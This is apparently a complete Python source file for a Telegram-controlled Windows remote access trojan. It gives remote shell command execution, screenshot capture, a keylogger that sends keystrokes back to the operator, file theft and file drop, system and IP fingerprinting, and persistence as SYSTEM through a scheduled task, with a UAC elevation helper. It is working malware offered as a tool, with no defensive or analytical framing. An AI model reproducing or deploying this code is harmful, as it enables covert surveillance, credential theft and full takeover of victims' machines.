import os
import mss
import subprocess
import telebot
from telebot.types import ReplyKeyboardMarkup, KeyboardButton
import requests
from telebot import types
from io import StringIO
import sys
import time
import traceback
import threading
import util
import config
import keyboard
import ctypes
 

abort = False
window = None
max_size = 4000
logs = StringIO()
threads = {}
results = {}

bot = telebot.TeleBot(config.TOKEN)
decode_charset = "utf-8"
hint_cmd = 0

def download_file(url, filename):
    if len(filename) > 0:
        local_filename = filename
    else:
        local_filename = url.split('/')[-1]
    r = requests.get(url, stream=True)
    r.raise_for_status()
    with open(local_filename, 'wb') as f:
        for chunk in r.iter_content(chunk_size=8192):
            if chunk:
                f.write(chunk)
    return local_filename

def shell(query):
    global decode_charset
    cmd = "cmd"
    try:
        process = subprocess.Popen(query, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out = process.stdout.read() + process.stderr.read()
        return out.decode(decode_charset, errors='replace') 
    except Exception as e:
        return f"Error executing command: {e}"


def on_exists(fname: str) -> None:
    try:
        bot.send_photo(chat_id, photo=open(fname, "rb").read())
    except:
        traceback.print_exc()


@bot.message_handler(commands=["cmd"])
def cmd(message):
    if message.text:
        try:
            # Використовуйте subprocess для виконання команди
            result = subprocess.run(message.text[5:], shell=True, capture_output=True, text=True)

            # Виведіть результати в чат
            if result.stdout:
                bot.send_message(message.chat.id, result.stdout)
            if result.stderr:
                bot.send_message(message.chat.id, "Error: " + result.stderr)

        except Exception as error:
            bot.send_message(message.chat.id, "Error: " + str(error))


def on_exists(fname: str) -> None:
    try:
        with open(fname, "rb") as photo:
            bot.send_photo(chat_id, photo)
        # Після відправлення видаліть файл
        os.remove(fname)
    except Exception as e:
        traceback.print_exc()

@bot.message_handler(commands=["screenshot"])
def screenshot(message):
    global chat_id
    chat_id = message.chat.id
    try:
        # Задайте шлях до папки users на диску C
        save_path = r"C:\users"
        
        with mss.mss() as sct:
            # Створіть унікальне ім'я файлу для зображення в папці save_path
            filename = os.path.join(save_path, f"screenshot_{int(time.time())}.png")
            # Зробіть скріншот та збережіть його
            sct.shot(output=filename)
            # Надішліть зображення боту
            on_exists(filename)
    except Exception as e:
        traceback.print_exc()


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if sys.argv[-1] != 'asadmin':
        script = os.path.abspath(sys.argv[0])
        params = ' '.join(sys.argv[1:] + ['asadmin'])
        ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, script, params, 1)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def run_as_admin():
    if sys.argv[-1] != 'asadmin':
        script = os.path.abspath(sys.argv[0])
        params = ' '.join(sys.argv[1:] + ['asadmin'])
        ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, script, params, 1)

@bot.message_handler(commands=["add_to_task_scheduler"])
def add_to_task_scheduller(message):
    # Отримайте шлях до виконуваного файлу
    program_path = os.path.abspath(__file__)

    try:
        # Створіть команду schtasks для додавання завдання в Task Scheduler
        task_command = f'schtasks /create /tn "Telegram_Remote_Shell" /tr "{program_path}" /sc onlogon /ru SYSTEM /f'
        
        # Викликайте команду за допомогою subprocess без передачі вводу
        subprocess.run(task_command, shell=True, check=True, text=True, capture_output=True)
        
        # Відправте повідомлення про успішне додавання до автозапуску
        bot.send_message(message.chat.id, "Program has been added to startup successfully.")
    except subprocess.CalledProcessError as e:
        # Відправте повідомлення про помилку додавання до автозапуску, якщо її виникла
        bot.send_message(message.chat.id, f"Error adding program to startup:\n{e.stderr}")

@bot.message_handler(commands=["info"])
def info(message):
    bot.send_message(message.chat.id, f"{util.username()}@{util.device()}({util.platform()}-x{util.architecture()}) {util.local_ip()} / {util.public_ip()} / {util.mac_address()}")


@bot.message_handler(commands=["start"])
def keys(message):
    keyboard_markup = ReplyKeyboardMarkup(True, False)
    keyboard_markup.add(
        KeyboardButton("/info"),
        KeyboardButton("dir"),
        KeyboardButton("/SYSTEMINFO"),
    )
    keyboard_markup.add(
        KeyboardButton("/charset 866"),
            KeyboardButton("/HelpMe"),
    )
    keyboard_markup.add(
        KeyboardButton("/keylog"),
            KeyboardButton("/getkeylog"),
                KeyboardButton("/screenshot"),
    )
    keyboard_markup.add(
    KeyboardButton("/add_to_task_scheduler"),           
    )
    keyboard_markup.add(
    KeyboardButton("/Start_Upload"), 
        KeyboardButton("/Stop_Upload"),          
    )

    bot.send_message(message.chat.id, f"keys", reply_markup=keyboard_markup)


@bot.message_handler(commands=["cd"])
def cd(message):
    try:
        os.chdir(message.text[4:])
    except Exception as error:
        bot.send_message(message.chat.id, "Error: " + str(error))


@bot.message_handler(commands=["charset"])
def charset(message):
    global decode_charset
    if len(message.text[9:]) > 0:
        decode_charset = message.text[9:]
    else:
        bot.send_message(message.chat.id, decode_charset)

@bot.message_handler(commands=["SYSTEMINFO"])
def system_info(message):
    try:
        result = shell("SYSTEMINFO")
        if result is not None:
            if len(result) > 3000:
                for i in range(0, 1 + int(round(len(result) / 3000))):
                    bot.send_message(message.chat.id, result[i * 3000:i * 3000 + 2999])
            else:
                bot.send_message(message.chat.id, result)
    except Exception as error:
        bot.send_message(message.chat.id, "Error: " + str(error))



@bot.message_handler(commands=["help"])
def help_command(message):
    bot.send_message(message.chat.id, """Remote bot commands:
/help - get help
/charset [charset] - set/get charset
/cd [folder] - change folder
/screenshot - make and send screenshot of screen
/cmd [command] - run shell command
/get [filename] - download file <50Mb
/SYSTEMINFO - get system information
/cmd [command] - Виконати команду з командної строки:

-------------------------------------
any other message will be treated as a command
upload files via attach
""")

@bot.message_handler(commands=["HelpMe"])
def help_me(message):
    bot.send_message(message.chat.id, 
        """ASSOC          Відображає або змінює асоціації розширень файлів.
ATTRIB         Відображає або змінює атрибути файлів.
BREAK          Задає або видаляє розширену перевірку CTRL+C.
BCDEDIT        Задає властивості в базі даних завантаження для керування завантаженням системи.
CACLS          Відображає або змінює списки контролю доступу (ACLs) файлів.
CALL           Викликає одну партійну програму з іншої.
CD             Відображає ім'я або змінює поточний каталог.
CHCP           Відображає або встановлює номер активної кодової сторінки.
CHDIR          Відображає ім'я або змінює поточний каталог.
CHKDSK         Перевіряє диск і відображає звіт про стан.
CHKNTFS        Відображає або змінює перевірку диска при завантаженні.
CLS            Очищує екран.
CMD            Запускає новий екземпляр інтерпретатора команд Windows.
COLOR          Задає колір переднього та фонового плану консолі за замовчуванням.
COMP           Порівнює вміст двох файлів або наборів файлів.
COMPACT        Відображає або змінює стиснення файлів на розділі NTFS.
CONVERT        Перетворює FAT-томи в NTFS. Ви не можете перетворити поточний диск.
COPY           Копіює один або кілька файлів в інше місце.
DATE           Відображає або встановлює дату.
DEL            Видаляє один або кілька файлів.
DIR            Відображає список файлів і підкаталогів в каталозі.
DISKPART       Відображає або налаштовує властивості розділу диска.
DOSKEY         Редагує рядки команд, відновлює команди Windows та створює макроси.
DRIVERQUERY    Відображає поточний стан та властивості драйверів пристроїв.
ECHO           Відображає повідомлення або увімкнює/вимикає виведення команди.
ENDLOCAL       Закінчує локалізацію змін оточення в партійному файлі.
ERASE          Видаляє один або кілька файлів.
EXIT           Завершує програму CMD.EXE (інтерпретатор команд).
FC             Порівнює два файли або набори файлів і відображає їх відмінності.
FIND           Шукає рядок тексту в файлі або файлах.
FINDSTR        Шукає рядки в файлах.
FOR            Виконує вказану команду для кожного файлу в наборі файлів.
FORMAT         Форматує диск для використання в Windows.
FSUTIL         Відображає або налаштовує властивості файлової системи.
FTYPE          Відображає або змінює типи файлів, які використовуються в асоціаціях файлових розширень.
GOTO           Направляє інтерпретатор команд Windows на позначену лінію у партійному файлі.
GPRESULT       Відображає інформацію про групову політику для машини або користувача.
GRAFTABL       Дозволяє Windows відображати розширений набір символів в графічному режимі.
HELP           Забезпечує інформацію про довідку для команд Windows.
ICACLS         Відображає, змінює, резервує або відновлює списки контролю доступу (ACLs) для файлів і каталогів.
IF             Виконує умовну обробку в партійних програмах.
""")
    bot.send_message(message.chat.id, """ LABEL          Створює, змінює або видаляє мітку тому диска.
MD             Створює каталог.
MKDIR          Створює каталог.
MKLINK         Створює символічні посилання та жорсткі посилання.
MODE           Налаштовує системний пристрій.
MORE           Відображає вивід по одному екрану за раз.
MOVE           Переміщує один або кілька файлів з одного каталогу в інший.
OPENFILES      Відображає файли, відкриті віддаленими користувачами для спільного використання файлів.
PATH           Відображає або задає шлях пошуку для виконуваних файлів.
PAUSE          Призупиняє обробку партійного файлу та відображає повідомлення.
POPD           Відновлює попереднє значення поточного каталогу, збережене PUSHD.
PRINT          Друкує текстовий файл.
PROMPT         Змінює командний вказівник Windows.
PUSHD          Зберігає поточний каталог та змінює його.
RD             Видаляє каталог.
RECOVER        Відновлює читабельну інформацію з поганого або пошкодженого диска.
REM            Записує коментарі (примітки) в партійних файлах або CONFIG.SYS.
REN            Перейменовує файл або файли.
RENAME         Перейменовує файл або файли.
REPLACE        Замінює файли.
RMDIR          Видаляє каталог.
ROBOCOPY       Розширений інструмент для копіювання файлів та дерев каталогів.
SET            Відображає, задає або видаляє змінні оточення Windows.
SETLOCAL       Починає локалізацію змін оточення в партійному файлі.
SC             Відображає або налаштовує служби (фонові процеси).
SCHTASKS       Заплановує команди та програми для запуску на комп'ютері.
SHIFT          Зміщує позицію замінюваних параметрів у партійних файлах.
SHUTDOWN       Дозволяє належне локальне або віддалене вимкнення комп'ютера.
SORT           Сортує введення.
START          Запускає окреме вікно для запуску вказаної програми чи команди.
SUBST          Асоціює шлях із літерою диска.
SYSTEMINFO     Відображає конкретні властивості та конфігурацію машини.
TASKLIST       Відображає всі поточно запущені завдання, включаючи служби.
TASKKILL       Завершує або зупиняє виконання запущеного процесу чи застосунку.
TIME           Відображає або встановлює системний час.
TITLE          Задає заголовок вікна для сеансу CMD.EXE.
TREE           Графічно відображає структуру каталогу диска чи шляху.
TYPE           Відображає вміст текстового файлу.
VER            Відображає версію Windows.
VERIFY         Сповіщає Windows, чи перевіряти, чи файли записані на диск правильно.
VOL            Відображає мітку тому та серійний номер диска.
XCOPY          Копіює файли та дерева каталогів.
WMIC           Відображає інформацію WMI всередині """)


eng_layout = """QWERTYUIOP{}ASDFGHJKL:"ZXCVBNM<>qwertyuiop[]asdfghjkl;'zxcvbnm,."""
rus_layout = """ЙЦУКЕНГШЩЗХЪФЫВАПРОЛДЖЭЯЧСМИТЬБЮйцукенгшщзхъфывапролджэячсмитьбю"""
ukr_layout = """ЙЦУКЕНГШЩЗХЇФІВАПРОЛДЖЄЯЧСМИТЬБЮйцукенгшщзхїфівапролджєячсмитьбю"""


def callback(event=None):
    if not event:
        return
    user32 = ctypes.WinDLL('user32', use_last_error=True)
    curr_window = user32.GetForegroundWindow()
    thread_id = user32.GetWindowThreadProcessId(curr_window, 0)
    klid = user32.GetKeyboardLayout(thread_id)
    lid = klid & (2 ** 16 - 1)
    lid_hex = hex(lid)
    name = event.name
    if len(name) > 1:
        if name == "space":
            name = " "
        elif name == "enter":
            name = "[ENTER]\n"
        elif name == "decimal":
            name = "."
        else:
            name = name.replace(" ", "_")
            name = f"[{name.upper()}]"
    else:
        if lid_hex == "0x419":
            pos = eng_layout.find(name)
            if pos != -1 and pos < len(rus_layout):
                name = rus_layout[pos]
        if lid_hex == "0x422":
            pos = eng_layout.find(name)
            if pos != -1 and pos < len(ukr_layout):
                name = ukr_layout[pos]

    logs.write(name)


@bot.message_handler(commands=["getkeylog"])
def getkeylog(message):
    result = logs.getvalue()
    if len(result) > 3000:
        for i in range(0, 1 + int(round(len(result) / 3000))):
            bot.send_message(message.chat.id, result[i * 3000:i * 3000 + 2999])
    else:
        bot.send_message(message.chat.id, result)


@bot.message_handler(commands=["keylog"])
def keylog(message):
    keyboard.on_release(callback=callback)
    return

    global threads
    try:
        keyboard_listener = keyboard.Listener(on_press=on_key_press)
        keyboard_listener.start()
    except Exception as e:
        traceback.print_exc()


@bot.message_handler(commands=["get"])
def get(message):
    if os.path.getsize(message.text[5:]) > 52428800:
        bot.send_message(message.chat.id, "Size is bigger than 50Mb: " + str(os.path.getsize(message.text[5:])))
    else:
        bot.send_document(message.chat.id, open(message.text[5:], 'rb'))


@bot.message_handler(commands=['Start_Upload'])
def start_upload(message):
    global upload_enabled
    upload_enabled = True
    bot.send_message(message.chat.id, "File uploads are enabled. Send any file to start uploading.")

@bot.message_handler(commands=['Stop_Upload'])
def stop_upload(message):
    global upload_enabled
    upload_enabled = False
    bot.send_message(message.chat.id, "File uploads are disabled.")

@bot.message_handler(content_types=['document', 'photo', 'video', 'audio', 'voice', 'sticker'])
def handle_file(message):
    global upload_enabled

    if upload_enabled:
        try:
            file_id = message.document.file_id if message.document else message.photo[-1].file_id if message.photo else \
                message.video.file_id if message.video else message.audio.file_id if message.audio else \
                message.voice.file_id if message.voice else message.sticker.file_id

            file_info = bot.get_file(file_id)
            file = bot.download_file(file_info.file_path)

            current_directory = os.getcwd()  # поточна директорія, куди будуть завантажуватись файли

            # Отримання розширення файлу
            file_extension = os.path.splitext(file_info.file_path)[-1].lower()

            # Збереження файлу у поточній директорії
            with open(os.path.join(current_directory, f"downloaded_file{file_extension}"), 'wb') as new_file:
                new_file.write(file)

            bot.send_message(message.chat.id, f"File '{file_info.file_path}' has been saved in the current directory.")
        except Exception as e:
            bot.send_message(message.chat.id, f"An error occurred: {str(e)}")


@bot.message_handler()
def other_messages(message):
    global hint_cmd
    message.text = "/cmd " + message.text
    cmd(message)


while True:
    try:
        bot.polling(none_stop=True)
    except Exception as e:
        print(f"Polling error: {e}")
        time.sleep(5)
